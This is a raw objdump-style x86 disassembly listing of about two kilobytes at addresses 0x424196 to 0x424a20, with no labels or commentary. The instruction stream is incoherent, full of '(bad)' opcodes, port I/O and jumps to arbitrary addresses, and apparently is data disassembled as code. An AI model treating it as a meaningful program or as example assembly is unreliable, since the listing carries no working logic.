  424196:	lds    edi,FWORD PTR [ebp+0x6dfd9e5]
  42419c:	or     cl,BYTE PTR ds:0xc4f9f90e
  4241a2:	mov    al,0xe0
  4241a5:	retf   
  4241a6:	mov    dl,0xcc
  4241a8:	jecxz  0x42418c
  4241aa:	cmc    
  4241ab:	mov    eax,0xcec8fbfe
  4241b0:	(bad)  
  4241b1:	jmp    edx
  4241b3:	shl    edi,1
  4241b5:	ret    
  4241b6:	in     eax,0xda
  4241b8:	(bad)  
  4241b9:	loope  0x424193
  4241bb:	or     eax,DWORD PTR [eax]
  4241bd:	fcmovnu st,st(2)
  4241bf:	cli    
  4241c0:	jmp    0x4241be
  4241c2:	call   0xe8092f98
  4241c7:	hlt    
  4241c8:	retf   0xd2e2
  4241cb:	out    0xda,al
  4241cd:	(bad)  
  4241ce:	rcr    esi,cl
  4241d0:	cmc    
  4241d1:	sar    DWORD PTR [eax-0x1a234023],cl
  4241d7:	repnz rcl edx,0xc1
  4241db:	(bad)  
  4241dc:	in     al,0x2
  4241de:	(bad)  
  4241e0:	leave  
  4241e1:	iret   
  4241e2:	in     eax,0xa6
  4241e4:	in     al,dx
  4241e5:	scas   eax,DWORD PTR es:[edi]
  4241e6:	(bad)  
  4241e7:	repnz repz loope 0x4241a5
  4241eb:	out    0xf4,al
  4241ed:	mov    esi,0xfdeabcd3
  4241f2:	cld    
  4241f3:	out    dx,al
  4241f4:	(bad)  
  4241f5:	loop   0x4241c8
  4241f7:	fsubrp st(0),st
  4241f9:	add    edi,ebx
  4241fb:	add    BYTE PTR [ebx],al
  4241fd:	(bad)  
  4241fe:	stc    
  4241ff:	dec    BYTE PTR [esi]
  424201:	iret   
  424202:	rol    esp,1
  424204:	mov    esp,0xfab2f2e9
  424209:	aad    0xf7
  42420b:	retf   
  42420c:	int    0xcb
  42420e:	div    bl
  424210:	(bad)  
  424211:	add    bh,BYTE PTR [esi-0x23241e08]
  424217:	in     al,0xc0
  424219:	cli    
  42421a:	add    eax,0xe900e1ff
  42421f:	(bad)
  424222:	mov    dl,0xd2
  424224:	rol    ah,cl
  424226:	loope  0x4241f3
  424228:	mov    al,0xcb
  42422a:	in     eax,0xc8
  42422c:	mov    ah,0xe6
  42422e:	(bad)
  424231:	shl    ecx,cl
  424233:	mov    eax,0xd3d1dbfb
  424238:	aam    0xa
  42423a:	add    al,BYTE PTR [esi]
  42423c:	push   es
  42423d:	add    ebp,ecx
  42423f:	leave  
  424240:	add    ebx,edx
  424242:	stos   DWORD PTR es:[edi],eax
  424243:	mov    ebp,0xcdb5f5de
  424248:	in     eax,0xd7
  42424a:	repnz mov ah,0xca
  42424d:	leave  
  42424e:	into   
  42424f:	mov    edi,0x7f3dbd4
  424254:	repnz idiv edi
  424257:	(bad)  
  424258:	div    al
  42425a:	cmc    
  42425b:	loopne 0x424246
  42425d:	add    BYTE PTR [edx],cl
  42425f:	leave  
  424260:	(bad)  
  424262:	fadd   st(7),st
  424264:	(bad)  
  424265:	call   0xce06f73b
  42426a:	jmp    0xc5293254
  42426f:	in     al,dx
  424270:	fidivr WORD PTR [ecx-0x1140f810]
  424276:	jecxz  0x42427f
  424278:	add    edx,esp
  42427a:	(bad)  
  42427b:	loop   0x42427d
  42427d:	loopne 0x42425d
  42427f:	out    0xc4,eax
  424281:	out    dx,eax
  424282:	mov    esi,0xcde9d0ce
  424287:	(bad)  
  424288:	jmp    0x424256
  42428a:	jmp    0x424240
  42428c:	(bad)  
  42428d:	jmp    0xfff2:0xb9cfb4db
  424294:	into   
  424295:	add    ecx,esp
  424297:	call   edi
  424299:	fstp   st(6)
  42429b:	retf   
  42429c:	add    eax,0x601eff4
  4242a1:	add    al,0xce
  4242a3:	(bad)  
  4242a4:	sar    DWORD PTR [esi-0x4d4c104e],cl
  4242aa:	mov    ch,0xfa
  4242ac:	fcmovnu st,st(3)
  4242ae:	(bad)  
  4242af:	jecxz  0x4242af
  4242b1:	leave  
  4242b2:	mov    ecx,0xfbc6e1f2
  4242b7:	cmc    
  4242b8:	loopne 0x4242a1
  4242ba:	sti    
  4242bb:	jmp    0xcb4d4c9c
  4242c0:	fucomi st,st(7)
  4242c2:	out    0xeb,al
  4242c4:	enter  0xb6ac,0xdb
  4242c8:	mov    dl,0xdb
  4242ca:	mov    bh,0xcb
  4242cc:	clc    
  4242cd:	in     eax,dx
  4242ce:	mov    eax,0xdde8d9d9
  4242d3:	pop    es
  4242d4:	int3   
  4242d5:	neg    edi
  4242d7:	mov    edx,0xffc603f3
  4242dc:	enter  0x6fb,0xc8
  4242e0:	(bad)  
  4242e2:	mov    ecx,0xeae7d2e0
  4242e7:	mov    bh,0xe1
  4242e9:	mov    edx,0xf2cadbb6
  4242ee:	jmp    0xe1:0xbcf1eab2
  4242f5:	ret    0xd7d4
  4242f8:	fndisi(8087 only) 
  4242fa:	add    ch,ah
  4242fc:	add    al,dh
  4242fe:	(bad)  
  4242ff:	call   0xb90e4dc9
  424304:	(bad)  
  424306:	(bad)  
  424307:	iret   
  424308:	in     al,dx
  424309:	mov    ah,0xca
  42430b:	repz in al,0xfa
  42430e:	aad    0xfa
  424310:	std    
  424311:	in     al,dx
  424312:	add    eax,ecx
  424314:	neg    ecx
  424316:	std    
  424317:	neg    cl
  424319:	retf   0xfe9
  42431c:	cmc    
  42431d:	add    esi,edi
  42431f:	add    edi,esp
  424321:	icebp  
  424322:	mov    esi,0xb2cef3c3
  424327:	retf   0xc4b0
  42432a:	mov    dh,0xd2
  42432c:	div    al
  42432e:	fdivp  st(2),st
  424330:	icebp  
  424331:	fdivr  st(7),st
  424333:	mov    edx,0xdcc2fcee
  424338:	pop    es
  424339:	inc    BYTE PTR [edx]
  42433b:	(bad)  
  42433c:	in     al,0x6
  42433e:	aam    0xda
  424340:	in     eax,dx
  424341:	pop    es
  424342:	(bad)  
  424344:	mov    esp,0xd1d1d7cf
  424349:	in     al,0xd2
  42434b:	(bad)  
  42434c:	stc    
  42434d:	in     al,0xb7
  42434f:	enter  0xedeb,0xfd
  424353:	mov    ebp,0xddd5f5ce
  424358:	std    
  424359:	aad    0xdf
  42435b:	loopne 0x424365
  42435d:	clc    
  42435e:	add    al,0xe7
  424360:	enter  0xcef3,0xac
  424364:	enter  0xb1e2,0xbc
  424368:	into   
  424369:	loopne 0x424358
  42436b:	mov    cl,0xcb
  42436d:	jmp    0xb8e2:0xeefee4c5
  424374:	idiv   DWORD PTR [ebp-0x1b1f332b]
  42437a:	loopne 0x424359
  42437c:	add    al,0xc6
  42437e:	(bad)  
  42437f:	or     al,0xda
  424381:	in     eax,dx
  424382:	mov    edi,0xc0bda9ce
  424387:	leave  
  424388:	mov    bh,0xc9
  42438a:	mov    ecx,0xcdb4dbec
  42438f:	sar    DWORD PTR [edi-0x2a3e3711],1
  424395:	(bad)  
  424397:	or     eax,ecx
  424399:	jmp    0x424366
  42439b:	(bad)  
  42439c:	mov    ebp,0xfaccfaff
  4243a1:	std    
  4243a2:	loope  0x424367
  4243a4:	int3   
  4243a5:	into   
  4243a6:	lods   al,BYTE PTR ds:[esi]
  4243a7:	xlat   BYTE PTR ds:[ebx]
  4243a8:	jmp    0xfb331e79
  4243ad:	in     eax,dx
  4243ae:	into   
  4243af:	int    0xdb
  4243b1:	mov    esp,0x2c20101
  4243b6:	in     eax,0xd9
  4243b8:	ror    DWORD PTR [edx],1
  4243ba:	(bad)  
  4243bb:	loopne 0x4243a5
  4243bd:	add    al,bh
  4243bf:	push   es
  4243c0:	or     eax,esp
  4243c2:	out    0xe7,al
  4243c4:	jecxz  0x4243a8
  4243c6:	div    cl
  4243c8:	mov    cl,0xd6
  4243ca:	fcmovnu st,st(0)
  4243cc:	mov    dh,0xdd
  4243ce:	out    dx,al
  4243cf:	sti    
  4243d0:	cmc    
  4243d1:	jecxz  0x42438d
  4243d3:	loope  0x424396
  4243d5:	add    eax,edi
  4243d7:	cmc    
  4243d8:	cli    
  4243d9:	fcomp  st(6)
  4243db:	add    dl,ch
  4243dd:	(bad)
  4243e0:	in     eax,dx
  4243e1:	push   cs
  4243e2:	shl    al,1
  4243e4:	iret   
  4243e5:	(bad)  
  4243e7:	int    0xea
  4243e9:	aam    0xf2
  4243eb:	(bad)  
  4243ec:	mov    edi,0xbdf3dfcf
  4243f1:	hlt    
  4243f2:	add    bl,dh
  4243f4:	test   BYTE PTR ds:0xfcd6c7c6,0xd1
  4243fb:	(bad)  
  4243fd:	jecxz  0x4243d4
  4243ff:	cld    
  424400:	or     eax,0xc7b0e1da
  424405:	repnz mov al,0xf7
  424408:	shl    DWORD PTR [ecx-0x16464634],1
  42440e:	into   
  42440f:	into   
  424410:	sti    
  424411:	fidivr WORD PTR [edx-0x2d3e0646]
  424417:	(bad)
  42441a:	(bad)  
  42441b:	add    dl,cl
  42441d:	into   
  42441e:	fdiv   st(7),st
  424420:	repnz or bl,ch
  424423:	enter  0xd7d6,0xc3
  424427:	call   0xf9342ddf
  42442c:	stc    
  42442d:	cli    
  42442e:	mov    bh,0xdc
  424430:	mov    edx,0x103d1d3
  424435:	add    eax,0xcbd6dbec
  42443a:	shl    eax,1
  42443c:	jmp    0x424444
  42443e:	clc    
  42443f:	dec    eax
  424441:	push   es
  424442:	mov    ebp,0xe1ebcfbc
  424447:	repnz in al,0xc7
  42444a:	out    dx,al
  42444b:	call   0xdb1afa05
  424450:	mov    esp,0xf0e7f3e9
  424455:	aad    0xd6
  424457:	add    eax,DWORD PTR [edx]
  424459:	aad    0xd7
  42445b:	(bad)  
  42445c:	hlt    
  42445d:	fadd   DWORD PTR [edi]
  42445f:	fiadd  DWORD PTR [ecx]
  424461:	or     ebp,esp
  424463:	mov    al,0xa8
  424465:	mov    bh,0xb5
  424467:	mov    bh,0xf0
  424469:	icebp  
  42446a:	out    0xfb,eax
  42446c:	rcl    ebp,1
  42446e:	fsubr  st,st(3)
  424470:	out    dx,eax
  424471:	fstp   TBYTE PTR [ecx-0x111f82c]
  424477:	loop   0x42445a
  424479:	(bad)  
  42447a:	fcmovnu st,st(3)
  42447c:	add    al,0xcf
  42447e:	int    0xc6
  424480:	repz stc 
  424482:	leave  
  424483:	(bad)  
  424485:	loopne 0x424474
  424487:	mov    ebp,0xf9ecd9d0
  42448d:	iret   
  42448e:	mov    dh,0xbf
  424490:	shl    al,cl
  424492:	loopne 0x424491
  424494:	xlat   BYTE PTR ds:[ebx]
  424495:	pop    es
  424496:	(bad)  
  424497:	(bad)  
  424499:	shl    cl,cl
  42449b:	pop    es
  42449c:	loop   0x4244a0
  42449e:	cli    
  42449f:	add    al,ch
  4244a1:	add    ebp,DWORD PTR [edx-0x2d235211]
  4244a7:	loope  0x42446f
  4244a9:	jmp    0x42447a
  4244ab:	scas   al,BYTE PTR es:[edi]
  4244ac:	lock fnstcw WORD PTR [edi-0x250e412b]
  4244b3:	div    DWORD PTR [ebp-0x22140914]
  4244b9:	ror    ebx,0xe8
  4244bc:	pop    es
  4244bd:	pop    es
  4244be:	iret   
  4244bf:	std    
  4244c0:	in     eax,0xe4
  4244c2:	fidivr WORD PTR [ecx+esi*4-0x4a3d304e]
  4244c9:	out    0xe1,al
  4244cb:	jmp    0x42447d
  4244cd:	(bad)  
  4244ce:	in     eax,0xc8
  4244d0:	add    edi,DWORD PTR [ebp-0x470c2308]
  4244d6:	pop    es
  4244d7:	(bad)  
  4244d8:	clc    
  4244d9:	or     esi,esp
  4244db:	aad    0xd6
  4244dd:	out    0xca,eax
  4244df:	std    
  4244e0:	fcmovnbe st,st(3)
  4244e2:	fsubr  DWORD PTR [ebp-0x38282238]
  4244e8:	repz shl DWORD PTR [ecx+esi*8-0x324b0629],cl
  4244f0:	(bad)  
  4244f2:	jecxz  0x4244dc
  4244f4:	clc    
  4244f5:	(bad)  
  4244f6:	fcmovnu st,st(7)
  4244f8:	lds    ecx,FWORD PTR [ebx]
  4244fa:	jmp    0xfd243c04
  4244ff:	add    edi,esp
  424501:	jecxz  0x4244d0
  424503:	in     al,dx
  424504:	(bad)  
  424505:	mov    al,0xd1
  424507:	mov    cl,0xf6
  424509:	in     al,dx
  42450a:	ror    bh,cl
  42450c:	leave  
  42450d:	fidiv  WORD PTR [ebx-0x1e403746]
  424513:	cld    
  424514:	in     eax,dx
  424515:	(bad)  
  424517:	repz add ecx,edi
  42451a:	aad    0xdd
  42451c:	fmul   st(6),st
  42451e:	cmc    
  42451f:	fild   DWORD PTR [ebx]
  424521:	in     al,dx
  424522:	jecxz  0x424511
  424524:	mov    bl,0xb7
  424526:	ret    0xf2d6
  424529:	in     al,dx
  42452a:	(bad)  
  42452b:	call   0xda0e17ea
  424530:	cli    
  424531:	aad    0xdc
  424533:	mov    ebp,0xe7e7dfd2
  424538:	(bad)  
  424539:	retf   0xf5d6
  42453c:	cld    
  42453d:	std    
  42453e:	fsubr  st(1),st
  424540:	(bad)
  424543:	jmp    0xf1cc:0xcbf1f2f6
  42454a:	mov    ebx,0xb4d9fab9
  42454f:	mov    ebx,0xfbf9f8
  424554:	mov    eax,0xe1d900e7
  424559:	mov    esp,0xe206e0c3
  42455e:	aad    0xec
  424560:	fst    DWORD PTR [ebx]
  424562:	rcl    al,0xe1
  424565:	(bad)  
  424566:	mov    al,0xcd
  424568:	(bad)  
  424569:	ror    ah,cl
  42456b:	int3   
  42456c:	jmp    0xf8f0:0xedd4d1ac
  424573:	(bad)  
  424575:	add    bl,bh
  424577:	push   es
  424578:	fiadd  WORD PTR [edx]
  42457a:	(bad)  
  42457c:	retf   
  42457d:	aam    0xfe
  42457f:	iret   
  424580:	into   
  424581:	(bad)  
  424582:	mov    esi,0xabf7ccc0
  424587:	iret   
  424588:	(bad)  
  424589:	(bad)  
  42458b:	mov    bh,0xd9
  42458d:	aam    0xb8
  42458f:	mov    edx,0xb6d6d6c3
  424594:	int3   
  424595:	push   edi
  424597:	(bad)
  42459a:	ret    
  42459b:	or     ecx,DWORD PTR [eax]
  42459d:	jmp    0x4245a7
  42459f:	or     cl,BYTE PTR [edi]
  4245a1:	or     ch,bh
  4245a3:	test   eax,0xbcc0c3c6
  4245a8:	retf   
  4245a9:	mov    bl,0xb5
  4245ab:	retf   0xfbbb
  4245ae:	cmc    
  4245af:	(bad)  
  4245b0:	div    al
  4245b2:	mov    ebp,0xd7d3d2be
  4245b7:	(bad)  
  4245b8:	fcom   st(1)
  4245ba:	icebp  
  4245bb:	or     eax,DWORD PTR [eax]
  4245bd:	leave  
  4245be:	push   cs
  4245bf:	inc    BYTE PTR [ebx]
  4245c1:	out    0xb8,eax
  4245c3:	lock loop 0x4245b2
  4245c6:	les    edi,FWORD PTR [esp+eax*8-0x3b200534]
  4245cd:	mov    eax,0xd5e3cdf7
  4245d2:	(bad)  
  4245d4:	mov    eax,0xc6c0f2d3
  4245d9:	fcmovnbe st,st(6)
  4245db:	mov    BYTE PTR [edi],0xdb
  4245de:	push   cs
  4245df:	(bad)  
  4245e1:	or     al,ah
  4245e3:	vcmppd xmm0,xmm7,xmm5,0xcc
  4245e8:	jmp    0xb9d0:0xb5e0e7ef
  4245ef:	xlat   BYTE PTR ds:[ebx]
  4245f0:	jmp    0xfa01:0xf2d303fc
  4245f7:	repnz repnz aad 0xc9
  4245fb:	sti    
  4245fc:	cld    
  4245fd:	enter  0xedfd,0xcd
  424601:	fnop   
  424603:	(bad)  
  424604:	enter  0xe7e3,0xae
  424608:	retf   0xf6d9
  42460b:	lock (bad) 
  42460d:	cli    
  42460e:	mov    ebx,0xe1f7eecc
  424613:	loop   0x4245d7
  424615:	int3   
  424616:	(bad)
  424619:	shl    cl,1
  42461b:	fxch   st(2)
  42461d:	loopne 0x424627
  42461f:	pop    es
  424620:	loope  0x4245ea
  424622:	ret    
  424623:	fsubr  st(0),st
  424625:	jmp    0x42460c
  424627:	into   
  424628:	xlat   BYTE PTR ds:[ebx]
  424629:	(bad)  
  42462b:	scas   al,BYTE PTR es:[edi]
  42462c:	enter  0xd5d8,0xf8
  424630:	int3   
  424631:	call   edi
  424633:	ret    
  424634:	(bad)  
  424635:	fdiv   st,st(2)
  424637:	shr    edx,1
  424639:	ret    0xe7f9
  42463c:	hlt    
  42463d:	fmul   DWORD PTR [ebx]
  42463f:	in     eax,dx
  424640:	loopne 0x42460d
  424642:	loopne 0x4245fc
  424644:	mov    bh,0xe3
  424646:	ret    
  424647:	scas   al,BYTE PTR es:[edi]
  424648:	jmp    0x424604
  42464a:	mov    ecx,0xbbc6ebe4
  42464f:	add    esi,esi
  424651:	mov    esi,0xd0b9cfe1
  424656:	jmp    ecx
  424658:	icebp  
  424659:	or     ah,ch
  42465b:	loopne 0x424663
  42465d:	enter  0xbdd,0xe3
  424661:	in     al,dx
  424662:	shr    eax,cl
  424664:	call   0xd7301b2c
  424669:	jmp    0xef38fc67
  42466e:	mov    dh,0xfa
  424670:	out    dx,al
  424671:	out    dx,eax
  424672:	mov    esp,0xe7c6d0f6
  424677:	cld    
  424678:	in     al,0xe0
  42467a:	cli    
  42467b:	fiadd  WORD PTR [edx]
  42467d:	out    0xe8,eax
  42467f:	ret    0xebc5
  424682:	(bad)  
  424683:	jmp    0x42466e
  424685:	into   
  424686:	(bad)  
  424687:	int    0xd3
  424689:	hlt    
  42468a:	aam    0xda
  42468c:	sti    
  42468d:	lods   al,BYTE PTR ds:[esi]
  42468e:	(bad)  
  424690:	call   0xfc1f1c6c
  424695:	rol    ecx,1
  424697:	(bad)  
  424699:	jmp    0xdbc3:0xc8eec4e9
  4246a0:	retf   
  4246a1:	in     al,dx
  4246a2:	mov    esp,0xb3ccf3a6
  4246a7:	fucomi st,st(3)
  4246a9:	mov    dh,0xcf
  4246ab:	call   0xe0011983
  4246b0:	jmp    0x4246ae
  4246b2:	call   0xf1044896
  4246b7:	add    edx,eax
  4246b9:	test   esp,0xd0b0bfa
  4246bf:	mov    BYTE PTR [eax],0xe5
  4246c2:	stos   DWORD PTR es:[edi],eax
  4246c3:	les    edi,FWORD PTR [ebx+edx*8-0x3d3d1812]
  4246ca:	mov    ebx,0xecd9f2cd
  4246cf:	les    esi,FWORD PTR [ebp-0x24264617]
  4246d5:	ffree  st(3)
  4246d7:	fild   DWORD PTR [eax]
  4246d9:	(bad)  
  4246db:	add    ch,bl
  4246dd:	or     cl,BYTE PTR [esi+eiz*8]
  4246e0:	or     ecx,esi
  4246e2:	out    0xc6,eax
  4246e4:	shr    ebx,cl
  4246e6:	in     al,0xd6
  4246e8:	jmp    0xfbd5:0xf8e8d5b1
  4246ef:	fdivr  QWORD PTR [ebx-0x2a0d2c30]
  4246f5:	add    dh,bl
  4246f7:	inc    DWORD PTR [ebx]
  4246f9:	fcmovnb st,st(1)
  4246fb:	cmc    
  4246fc:	cld    
  4246fd:	clc    
  4246fe:	in     al,dx
  4246ff:	out    0xff,al
  424701:	or     eax,0xd1cba8c1
  424706:	cmc    
  424707:	lods   al,BYTE PTR ds:[esi]
  424708:	repnz mov bh,0xe7
  42470b:	out    dx,eax
  42470c:	mov    ch,0xba
  42470e:	mov    ch,0xbe
  424710:	retf   0xe9c9
  424713:	mov    esp,0xd1bbfefb
  424718:	stc    
  424719:	clc    
  42471a:	(bad)  
  42471b:	cmc    
  42471c:	or     BYTE PTR [eax],cl
  42471e:	loop   0x4246ea
  424720:	cli    
  424721:	clc    
  424722:	shl    dh,cl
  424724:	test   eax,0xd3d6c4c6
  424729:	out    dx,eax
  42472a:	shl    BYTE PTR [eax-0xf04403c],1
  424730:	(bad)  
  424731:	enter  0xdad0,0xf2
  424735:	rcr    eax,1
  424737:	(bad)  
  424738:	mov    ecx,0xc60bea0a
  42473d:	(bad)  
  42473e:	fmulp  st(0),st
  424740:	cld    
  424741:	or     DWORD PTR [esi-0x84d1010],ebp
  424747:	test   ebp,0xc8d2faea
  42474d:	xlat   BYTE PTR ds:[ebx]
  42474e:	retf   0xfff3
  424751:	leave  
  424752:	ret    0xdccf
  424755:	clc    
  424756:	(bad)  
  424758:	(bad)  
  42475a:	out    0xc7,eax
  42475c:	add    ecx,DWORD PTR ds:0xe1eafdc5
  424762:	retf   
  424763:	into   
  424764:	rol    edx,cl
  424766:	scas   al,BYTE PTR es:[edi]
  424767:	retf   
  424768:	int3   
  424769:	ret    0xd6ea
  42476c:	iret   
  42476d:	cmc    
  42476e:	icebp  
  42476f:	into   
  424770:	(bad)  
  424771:	int    0xc3
  424773:	jecxz  0x42476c
  424775:	out    0xfc,al
  424777:	int3   
  424778:	jmp    0x424736
  42477a:	fucomi st,st(1)
  42477c:	loopne 0x424754
  42477e:	aam    0xf8
  424780:	retf   
  424781:	or     ebx,eax
  424783:	leave  
  424784:	shl    ch,cl
  424786:	shl    ebp,0xda
  424789:	mov    dh,0xc1
  42478b:	rcl    ch,0xde
  42478e:	fsub   st,st(4)
  424790:	jmp    edx
  424792:	rol    edx,0x2
  424795:	(bad)  
  424796:	repz in eax,0xde
  424799:	(bad)  
  42479a:	std    
  42479b:	fcmovnb st,st(4)
  42479d:	add    eax,0xc4c801dc
  4247a2:	ror    dl,cl
  4247a4:	int3   
  4247a5:	int    0xe1
  4247a7:	jecxz  0x424771
  4247a9:	in     eax,0xe8
  4247ab:	clc    
  4247ac:	lock fcmovu st,st(3)
  4247af:	leave  
  4247b0:	retf   0xdefd
  4247b3:	int3   
  4247b4:	repnz shl edx,1
  4247b7:	(bad)  
  4247b8:	retf   
  4247b9:	test   al,0xdc
  4247bc:	out    dx,al
  4247bd:	jecxz  0x42478d
  4247bf:	int    0xc1
  4247c1:	pextrw ecx,mm4,0xc9
  4247c5:	scas   al,BYTE PTR es:[edi]
  4247c6:	rcl    esi,0xb0
  4247c9:	retf   0xedc7
  4247cc:	sti    
  4247cd:	rol    ah,cl
  4247cf:	jmp    0xc0fa:0xf0d4f1f0
  4247d6:	lock in al,dx
  4247d8:	add    dl,dl
  4247da:	fadd   DWORD PTR [edi]
  4247dc:	stc    
  4247dd:	jmp    0xe6ee:0xf212dde2
  4247e4:	les    esi,FWORD PTR [ecx-0x4f151113]
  4247ea:	out    0xb6,eax
  4247ec:	int3   
  4247ed:	push   DWORD PTR [eax+esi*8-0x2341430f]
  4247f4:	in     eax,dx
  4247f5:	mov    esp,0xe6c5fff9
  4247fa:	(bad)  
  4247fb:	hlt    
  4247fc:	(bad)  
  4247fd:	push   cs
  4247fe:	out    dx,eax
  4247ff:	retf   
  424800:	in     al,dx
  424801:	push   gs
  424803:	test   eax,0xd7d6cce0
  424808:	mov    cl,0xb4
  42480a:	out    dx,al
  42480b:	(bad)  
  42480c:	mov    bh,0xba
  42480e:	shl    ah,cl
  424810:	jmp    0x4247df
  424812:	ret    0xc2f7
  424815:	jecxz  0x42481a
  424817:	aam    0xe4
  424819:	inc    al
  42481b:	in     eax,0xe5
  42481d:	jmp    0xcaa9:0x13dce8c8
  424824:	mov    ebp,0xcebcb1e2
  424829:	repnz clc 
  42482b:	fidiv  DWORD PTR [edi-0x1d224a2b]
  424831:	into   
  424832:	int3   
  424833:	neg    ah
  424835:	into   
  424836:	mov    esp,0xc000f201
  42483b:	call   0xd0062249
  424840:	(bad)  
  424842:	retf   
  424843:	(bad)  
  424845:	mov    esi,0xcbc3c9e3
  42484a:	sar    BYTE PTR [eax-0x422f0c49],0xf8
  424851:	retf   0xf8da
  424854:	out    dx,al
  424855:	add    esp,esp
  424857:	jecxz  0x424850
  424859:	pop    es
  42485a:	hlt    
  42485b:	xlat   BYTE PTR ds:[ebx]
  42485c:	out    0xcf,al
  42485e:	(bad)  
  42485f:	fild   DWORD PTR [ebx]
  424861:	pop    es
  424862:	stos   BYTE PTR es:[edi],al
  424863:	faddp  st(0),st
  424865:	lods   al,BYTE PTR ds:[esi]
  424866:	jmp    0xe129f253
  42486b:	in     al,0xb5
  42486d:	mov    ecx,0x2dcf2ce
  424872:	in     eax,dx
  424873:	hlt    
  424874:	shl    ebp,0xf7
  424877:	rol    DWORD PTR [esi+esi*8],0xc1
  42487b:	call   0x8274e77
  424880:	or     al,BYTE PTR [esi]
  424882:	fnsave [ecx-0xc0f280a]
  424888:	aam    0xd3
  42488a:	mov    dl,0xd1
  42488c:	fcmovbe st,st(3)
  42488e:	fdiv   QWORD PTR [esi+ebx*8-0x12f0701]
  424895:	(bad)  
  424896:	mov    ebp,0xcbfed8c7
  42489b:	in     al,0x5
  42489d:	loopne 0x42486e
  42489f:	lds    eax,FWORD PTR [esi+ebx*8]
  4248a2:	leave  
  4248a3:	icebp  
  4248a4:	shl    al,cl
  4248a6:	loope  0x42488d
  4248a8:	retf   0xf7e6
  4248ab:	repnz (bad) 
  4248ad:	mov    edi,0xdebff7c5
  4248b2:	mov    ecx,0xe2bcfff4
  4248b7:	loope  0x42489d
  4248b9:	retf   
  4248ba:	jmp    esi
  4248bc:	fcmove st,st(2)
  4248be:	jmp    0xed4852a2
  4248c3:	xlat   BYTE PTR ds:[ebx]
  4248c4:	mov    bl,0xd7
  4248c6:	call   0xee2735bc
  4248cb:	out    dx,al
  4248cc:	in     al,dx
  4248cd:	retf   0xfaff
  4248d0:	ror    edi,cl
  4248d2:	mov    esp,0xe6bff2d1
  4248d7:	repz repz mov eax,0xdcdff4ff
  4248de:	(bad)  
  4248df:	loope  0x4248eb
  4248e1:	fadd   st(4),st
  4248e3:	lods   eax,DWORD PTR ds:[esi]
  4248e4:	xlat   BYTE PTR ds:[ebx]
  4248e5:	aad    0xdd
  4248e7:	icebp  
  4248e8:	cli    
  4248e9:	sti    
  4248ea:	int3   
  4248eb:	(bad)  
  4248ed:	lods   al,BYTE PTR ds:[esi]
  4248ee:	(bad)  
  4248ef:	mov    edi,0xc1dbd5ba
  4248f4:	not    al
  4248f6:	(bad)  
  4248f8:	loop   0x424904
  4248fa:	aam    0xd6
  4248fc:	or     DWORD PTR [ebx],ecx
  4248fe:	stc    
  4248ff:	fisttp DWORD PTR [ecx]
  424901:	(bad)  
  424903:	loope  0x4248f1
  424905:	out    0xcb,eax
  424907:	jmp    0x4248f0
  424909:	(bad)
  42490c:	jmp    0xdefd18bd
  424911:	loope  0x4248d5
  424913:	in     eax,dx
  424914:	sar    ah,1
  424916:	std    
  424917:	out    0xf9,eax
  424919:	(bad)  
  42491a:	or     ebx,edi
  42491c:	in     eax,0xdc
  42491e:	add    ecx,DWORD PTR [esi]
  424920:	(bad)  
  424922:	fsubr  st(1),st
  424924:	out    0xae,al
  424926:	out    0xd3,al
  424928:	out    dx,eax
  424929:	mov    ch,0xb0
  42492b:	not    ebx
  42492d:	shl    DWORD PTR [edi-0x5210710],cl
  424933:	shl    ebx,0xe0
  424936:	xlat   BYTE PTR ds:[ebx]
  424937:	(bad)  
  424939:	fcomp  st(0)
  42493b:	(bad)  
  42493c:	fadd   QWORD PTR [eax]
  42493e:	jmp    0x424945
  424940:	les    ecx,FWORD PTR [eax]
  424942:	mov    eax,0xd4c5f3d0
  424947:	aam    0xc2
  424949:	enter  0xf2ca,0xad
  42494d:	(bad)  
  42494e:	fst    st(2)
  424950:	mov    ch,0xd2
  424952:	ret    0xfaf7
  424955:	loop   0x424958
  424957:	faddp  st(3),st
  424959:	add    ebp,edx
  42495b:	lock stc 
  42495d:	stc    
  42495e:	(bad)  
  42495f:	or     dl,bl
  424961:	into   
  424962:	iret   
  424963:	mov    dl,0xcf
  424965:	rcl    ecx,0xc6
  424968:	loop   0x424960
  42496a:	int    0xb4
  42496c:	out    dx,eax
  42496d:	sar    cl,1
  42496f:	mov    ch,0xd5
  424971:	fnstsw WORD PTR [ebx-0xa323e3f]
  424977:	(bad)  
  424979:	loope  0x424972
  42497b:	(bad)  
  42497d:	pmullw mm1,mm1
  424980:	fxch   st(3)
  424982:	mov    bl,0xc9
  424984:	jecxz  0x424975
  424986:	fnstsw WORD PTR [eax+ecx*8-0x47443a3e]
  42498d:	mov    dh,0xcb
  42498f:	fidivr DWORD PTR [ebp-0x70b0203]
  424995:	sar    bl,0xfc
  424998:	pop    es
  424999:	or     al,cl
  42499b:	add    bh,cl
  42499d:	retf   0xeeca
  4249a0:	add    eax,0xf7dcc3ca
  4249a5:	test   al,0xf7
  4249a7:	mov    esp,0xb1bab7b5
  4249ac:	(bad)  
  4249ad:	repz fucomp st(5)
  4249b0:	mov    ebx,0xd8cfdbe8
  4249b5:	std    
  4249b6:	stc    
  4249b7:	repnz in eax,0xca
  4249ba:	retf   0xf7e2
  4249bd:	in     al,0xd8
  4249bf:	loopne 0x4249af
  4249c1:	fldcw  WORD PTR [eax-0x5009571a]
  4249c7:	icebp  
  4249c8:	fcmove st,st(7)
  4249ca:	into   
  4249cb:	(bad)  
  4249cc:	rcr    al,1
  4249ce:	(bad)  
  4249cf:	rol    DWORD PTR [edx],cl
  4249d1:	in     eax,dx
  4249d2:	leave  
  4249d3:	out    0xbf,eax
  4249d5:	shl    ebp,cl
  4249d7:	xlat   BYTE PTR ds:[ebx]
  4249d8:	rol    BYTE PTR [edx+eax*8],cl
  4249db:	stc    
  4249dc:	retf   
  4249dd:	(bad)
  4249e0:	stc    
  4249e1:	jmp    FWORD PTR [edi-0x54420d56]
  4249e7:	retf   
  4249e8:	icebp  
  4249e9:	repz div DWORD PTR [esi-0x2d414019]
  4249f0:	add    edx,edx
  4249f2:	call   0xbf460bb1
  4249f7:	stc    
  4249f8:	(bad)  
  4249fb:	aam    0xe1
  4249fd:	(bad)
  424a00:	out    0xe,eax
  424a02:	icebp  
  424a03:	mov    esp,0xeeb0c9ca
  424a08:	hlt    
  424a09:	retf   
  424a0a:	repnz cli 
  424a0c:	cli    
  424a0d:	int    0xb8
  424a0f:	idiv   DWORD PTR [ebp-0x460943]
  424a15:	rcl    dh,0xd6
  424a18:	ret    0xd1
  424a1b:	in     al,0xc5
  424a1d:	(bad)  
  424a1e:	add    eax,ebp
  424a20:	loop   0x424a08
